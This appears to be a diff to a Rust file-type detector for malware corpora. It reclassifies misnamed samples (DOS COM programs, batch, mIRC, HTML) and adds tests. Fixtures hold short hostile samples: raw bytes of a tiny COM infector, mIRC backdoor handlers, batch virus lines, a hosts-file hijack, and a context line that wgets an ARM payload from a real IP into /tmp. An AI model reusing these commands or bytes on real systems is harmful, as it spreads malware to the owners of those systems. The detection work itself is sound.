@@ -1386,6 +1386,9 @@ fn mark_replaces(file_type: FileType) -> bool {
         file_type,
         FileType::Text
             | FileType::Html
+            // An `.a` that reaches here has no `!<arch>` magic, so it claims
+            // nothing a mark could contradict.
+            | FileType::StaticLib
             | FileType::ObjectiveC
             | FileType::Lua
             | FileType::Clojure
@@ -1717,15 +1720,19 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     // Object code with a source extension is not that language. DOS COM samples
     // named `Burger.m` or `Trivial.45.t` used to inherit Objective-C or Perl
     // from the suffix. UTF-16 source is excluded inside `binary_not_source`.
-    if let Some(ext) = ext_ft.filter(|ft| ft.is_source_code()) {
+    if let Some(ext) = ext_ft.filter(|ft| claims_source(*ft)) {
         if heuristics::binary_not_source(data) {
-            let file_type = if heuristics::looks_like_dos_com(data) {
-                FileType::DosCom
-            } else {
-                FileType::Data
-            };
             return Some(Detection {
-                file_type,
+                file_type: binary_body_type(data),
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(ext),
+            });
+        }
+        // Text the extension misnames: a page, or another language the scorer
+        // is sure of while finding nothing of the claimed one.
+        if let Some(found) = heuristics::contradicts_extension(ext, data) {
+            return Some(Detection {
+                file_type: found,
                 source: DetectionSource::Heuristic,
                 ext_match: ExtensionMatch::Different(ext),
             });
@@ -1750,12 +1757,50 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
     // Stage 4: Extension fallback (used when no content-first detector resolved
     // and the filename was not well-known).
     if let Some(file_type) = ext_ft {
+        // A format defined by its magic, whose magic stage 1 did not find. The
+        // name is the only thing claiming it, and the bytes have already said
+        // no: vxheaven's `.a` variant letter made 200+ DOS programs, boot
+        // sectors and batch files "static libraries", and an HTML page named
+        // `.ko` became an ELF module.
+        if !data.is_empty() && is_magic_defined(file_type) {
+            return Some(Detection {
+                file_type: unclaimed_body_type(data),
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(file_type),
+            });
+        }
+        // `.m` is where every misnamed sample lands. Objective-C carries
+        // directives the scorer knows (`#import`, `@interface`) or at least C
+        // statement structure; text with neither is not Objective-C because
+        // of its last letter.
+        if file_type == FileType::ObjectiveC
+            && !data.is_empty()
+            && !heuristics::has_language_evidence(file_type, data)
+            && !heuristics::looks_like_c_family(data)
+            && !heuristics::is_utf16_text(data)
+        {
+            return Some(Detection {
+                file_type: unclaimed_body_type(data),
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(file_type),
+            });
+        }
         // HTML extension requires content validation. Use the extended window:
         // reaching here means the filename claims HTML, and that claim is what
         // licenses looking past a short prefix. Otherwise front-padding the file
         // downgrades it to Unknown, which matches no trait at all.
         if file_type == FileType::Html && !heuristics::looks_like_html(data) {
             return None;
+        }
+        // `.bin`/`.dat`/`.raw` say nothing about the content, and DOS samples
+        // routinely carry them. A COM-shaped body under a generic data name is
+        // the program, not opaque data.
+        if file_type == FileType::Data && heuristics::looks_like_unnamed_dos_com(data) {
+            return Some(Detection {
+                file_type: FileType::DosCom,
+                source: DetectionSource::Heuristic,
+                ext_match: ExtensionMatch::Different(FileType::Data),
+            });
         }
         return Some(Detection {
             file_type,
@@ -1764,7 +1809,75 @@ pub fn detect(path: &Path, data: &[u8]) -> Option<Detection> {
         });
     }
 
+    // No extension and nothing above recognised it. Corpora name samples by
+    // hash, so a DOS COM there has no `.com` to go on; without this it was
+    // Unknown, which no trait walks, and every DOS rule was blind to it.
+    if heuristics::looks_like_unnamed_dos_com(data) {
+        return Some(Detection {
+            file_type: FileType::DosCom,
+            source: DetectionSource::Heuristic,
+            ext_match: if has_named_extension(path) {
+                ExtensionMatch::Unknown
+            } else {
+                ExtensionMatch::Consistent
+            },
+        });
+    }
+
     None
+}
+
+/// Types whose extension names a language or script, so a body that is not
+/// text, or is plainly another language, contradicts it.
+fn claims_source(ft: FileType) -> bool {
+    ft.is_source_code()
+        || matches!(
+            ft,
+            FileType::Clojure | FileType::Batch | FileType::Vbs | FileType::AppleScript
+        )
+}
+
+/// Formats that start with magic stage 1 always recognises. Reaching the
+/// extension fallback means the magic is absent, so the name is wrong.
+fn is_magic_defined(ft: FileType) -> bool {
+    matches!(
+        ft,
+        FileType::StaticLib
+            | FileType::Elf
+            | FileType::Pe
+            | FileType::MachO
+            | FileType::JavaClass
+            | FileType::Dex
+            | FileType::Wasm
+    )
+}
+
+/// Object code with no header: a DOS COM program when it calls DOS, otherwise
+/// opaque data.
+fn binary_body_type(data: &[u8]) -> FileType {
+    if heuristics::looks_like_dos_com(data) {
+        FileType::DosCom
+    } else {
+        FileType::Data
+    }
+}
+
+/// What a body is once its extension has been ruled out: binary, a page, a
+/// language the scorer recognises, or plain text. A COM program shorter than
+/// the binary judgement's window still cannot pass as text: `CD 21` is never
+/// valid UTF-8.
+fn unclaimed_body_type(data: &[u8]) -> FileType {
+    if heuristics::binary_not_source(data)
+        || (heuristics::looks_like_dos_com(data) && std::str::from_utf8(data).is_err())
+    {
+        binary_body_type(data)
+    } else if let Some(marked) = heuristics::unmistakable(data) {
+        marked
+    } else if heuristics::looks_like_html(data) {
+        FileType::Html
+    } else {
+        heuristics::detect_from_content(data).unwrap_or(FileType::Text)
+    }
 }
 
 /// Detect file type from content alone (magic bytes + shebangs only).
@@ -1928,9 +2041,17 @@ mod tests {
         );
     }
 
+    /// `.class` and `.dex` are defined by their magic. A name with no magic
+    /// behind it is not the format; the body decides.
     #[test]
-    fn java_class_by_ext() {
-        assert_ext("Foo.class", FileType::JavaClass);
+    fn magic_defined_names_need_their_magic() {
+        assert_detect("Foo.class", b"x = 1\n", FileType::Text);
+        assert_detect("classes.dex", b"x = 1\n", FileType::Text);
+        assert_detect(
+            "Exploit.JS.RealPlr.ko",
+            b"<html><body><script>var a=1;</script></body></html>\n",
+            FileType::Html,
+        );
     }
 
     #[test]
@@ -2024,11 +2145,6 @@ mod tests {
     #[test]
     fn python_bytecode_by_ext() {
         assert_ext("mod.pyc", FileType::PythonBytecode);
-    }
-
-    #[test]
-    fn dex_by_ext() {
-        assert_ext("classes.dex", FileType::Dex);
     }
 
     // ── JavaScript / TypeScript ──────────────────────────────────────
@@ -2196,8 +2312,115 @@ cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; ch
 
     #[test]
     fn objc_by_ext() {
-        assert_ext("view.m", FileType::ObjectiveC);
-        assert_ext("view.mm", FileType::ObjectiveC);
+        // Plain C is Objective-C too; with no directive to score, C statement
+        // structure keeps the name.
+        let c = b"extern void GoFunc();\nint main(int argc, char **argv) {\n\tGoFunc();\n}\n";
+        assert_detect("view.m", c, FileType::ObjectiveC);
+        assert_detect("view.mm", c, FileType::ObjectiveC);
+    }
+
+    /// A `.m` of many `#include` lines scores heavily for C, and a couple of
+    /// directives still make it Objective-C.
+    #[test]
+    fn objc_directives_beat_c_includes() {
+        let mut src = b"#include <stdio.h>\n".repeat(12);
+        src.extend_from_slice(
+            b"#import <Foundation/Foundation.h>\n@interface Foo : NSObject\n@end\n",
+        );
+        assert_detect("Foo.mm", &src, FileType::ObjectiveC);
+    }
+
+    /// Text with neither a directive nor C structure is not Objective-C
+    /// because of its last letter: a MATLAB script, a hosts file.
+    #[test]
+    fn m_without_objc_or_c_structure_is_text() {
+        assert_detect(
+            "genherm.m",
+            b"% Hermite points\nx = linspace(0, 1, 10)\ndisp(x)\n",
+            FileType::Text,
+        );
+        assert_detect(
+            "Trojan.Win32.Qhost.m",
+            b"127.0.0.1 ruworld.com\r\n127.0.0.1 example.net\r\n",
+            FileType::Text,
+        );
+    }
+
+    /// A batch file under a Perl test name. Perl's `.t` has nothing to say
+    /// against `@echo off` when the body carries no Perl at all.
+    #[test]
+    fn batch_body_contradicts_perl_extension() {
+        assert_detect(
+            "Trojan.BAT.Looper.t",
+            b"@echo off\r\n:loop\r\ngoto loop\r\n",
+            FileType::Batch,
+        );
+        assert_detect(
+            "Virus.BAT.Silly.m",
+            b"if \"%1==\" for %%i in (*.b*) do call %0 %%i\r\n",
+            FileType::Batch,
+        );
+    }
+
+    /// `start WScript.exe x.vbs` is a batch line launching the host.
+    #[test]
+    fn wscript_exe_is_not_vbscript() {
+        let bat = b"@echo off\r\nif exist sys32.vbs start WScript.exe sys32.vbs&exit\r\nif exist a.vbs start WScript.exe a.vbs&exit\r\n";
+        assert_detect("Worm.VBS.Autorun.m", bat, FileType::Batch);
+    }
+
+    /// mIRC handlers at any level and for any event, and mIRC's saved-script INI.
+    #[test]
+    fn mirc_event_headers_and_saved_script() {
+        assert_detect(
+            "Backdoor.IRC.Cloner.m",
+            b"on 10:TEXT:*:*:{\n  if ($1 == !quit) { /quit }\n}\n",
+            FileType::Mirc,
+        );
+        assert_detect(
+            "Backdoor.IRC.CWSBD",
+            b"on *:start: {\n  socklisten door 37173\n}\n",
+            FileType::Mirc,
+        );
+        assert_detect(
+            "IRC-Worm.IRC.TooLame.a",
+            b"[script]\r\nn0=on 1:LOAD: { .ial on }\r\nn1=on 1:UNLOAD: { .quit }\r\n",
+            FileType::Mirc,
+        );
+        // A VBScript that writes a mIRC script quotes the header mid-line.
+        assert_detect(
+            "Email-Worm.VBS.LoveLetter.bb",
+            b"On Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nscriptini.WriteLine \"n0=on 1:JOIN:#:{\"\nWScript.Echo 1\n",
+            FileType::Vbs,
+        );
+    }
+
+    /// An alias file written with mIRC identifiers is mIRC even when it
+    /// writes batch lines into the file it drops.
+    #[test]
+    fn mirc_alias_file_is_mirc_not_batch() {
+        let src = b"alias xspread {\r\n  .write x-.bat net view > x-.txt\r\n  .write x-.bat @echo off\r\n  .timersx 1 20 xcopy1\r\n}\r\nalias xcopy1 {\r\n  if ($lines(x-.txt) < 6) { halt }\r\n}\r\n";
+        assert_detect("Trojan.IRC.Nullpy.a", src, FileType::Mirc);
+        // ircII shares the brace form, but not mIRC's identifiers.
+        assert_ne!(
+            detect(Path::new("x.irc"), b"alias hi {\n  echo hello\n}\n").map(|d| d.file_type),
+            Some(FileType::Mirc)
+        );
+    }
+
+    /// A 27-byte COM infector is too short for the percentage alone, and a
+    /// zero-filled header is NUL in both lanes -- not UTF-16 text.
+    #[test]
+    fn short_and_nul_padded_binaries_are_not_source() {
+        let com = [
+            0xb4, 0x4e, 0xba, 0x10, 0x01, 0xcd, 0x21, 0xb4, 0x3c, 0xba, 0x9e, 0x00, 0xcd, 0x21,
+            0xb2, 0x1b, 0x2a, 0x2e, 0x43, 0x4f, 0x4d, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf1,
+        ];
+        assert_detect("Virus.DOS.Trivial.27.m", &com, FileType::DosCom);
+        let mut jet = vec![0x00u8, 0x01, 0x00, 0x00];
+        jet.extend_from_slice(b"Standard Jet DB\0");
+        jet.resize(2048, 0);
+        assert_detect("Virus.MSAccess.Poison.c", &jet, FileType::Data);
     }
 
     #[test]
@@ -2336,6 +2559,38 @@ Coordinate with the Applet Maintainer before sweeping changes.\n";
         assert_detect("Trivial.45.t", &com, FileType::DosCom);
         assert_detect("prog.com", &com, FileType::DosCom);
         assert_detect("prog.com", b"MZ\x90\x00", FileType::Pe);
+    }
+
+    /// Corpora name samples by hash or give them a generic data suffix, so a
+    /// COM program there has no `.com`. It was Unknown / Data, which no DOS
+    /// rule walks.
+    #[test]
+    fn dos_com_without_a_telling_name_is_dos_com() {
+        let mut com = vec![0x90u8; 80];
+        for i in (0..80).step_by(8) {
+            com[i] = 0x01;
+        }
+        com[11] = 0xCD;
+        com[12] = 0x21;
+        assert_detect(
+            "0f3a9c1e2b7d4f6a8e5c3b1a9d7f5e3c1b9a7d5f3e1c9b7a5d3f1e9c7b5a3d1f",
+            &com,
+            FileType::DosCom,
+        );
+        assert_detect("prog", &com, FileType::DosCom);
+        assert_detect("prog.bin", &com, FileType::DosCom);
+    }
+
+    /// The same bytes past the 64 KiB COM limit are not a COM program: that is
+    /// how a ciphertext or firmware blob with a chance `CD 21` stays data.
+    #[test]
+    fn oversized_blob_with_int21_is_not_dos_com() {
+        let mut blob = vec![0x01u8; heuristics::DOS_COM_MAX_SIZE + 1];
+        blob[11] = 0xCD;
+        blob[12] = 0x21;
+        assert_detect("prog.bin", &blob, FileType::Data);
+        let det = detect(Path::new("prog"), &blob);
+        assert!(det.is_none_or(|d| d.file_type != FileType::DosCom));
     }
 
     #[test]
@@ -3767,13 +4022,22 @@ mod static_lib_extension_override_tests {
         assert!(d.extension_mismatch());
     }
 
-    /// The extension is still the fallback when nothing recognises the body.
+    /// An `.a` without `!<arch>` is never a static library. An 8-byte COM
+    /// program is still a program: `CD 21` is never valid UTF-8.
     #[test]
-    fn unrecognised_body_named_dot_a_falls_back_to_static_lib() {
+    fn dot_a_without_ar_magic_is_its_body() {
         let data = [0xe9u8, 0x12, 0x00, 0xb4, 0x09, 0xcd, 0x21, 0xc3];
         assert_eq!(
             detect(Path::new("Virus.DOS.Trivial.40.a"), &data).map(|d| d.file_type),
-            Some(FileType::StaticLib)
+            Some(FileType::DosCom)
+        );
+        assert_eq!(
+            detect(
+                Path::new("Backdoor.IRC.Notes.a"),
+                b"see you on the channel tonight\n"
+            )
+            .map(|d| d.file_type),
+            Some(FileType::Text)
         );
     }
 }
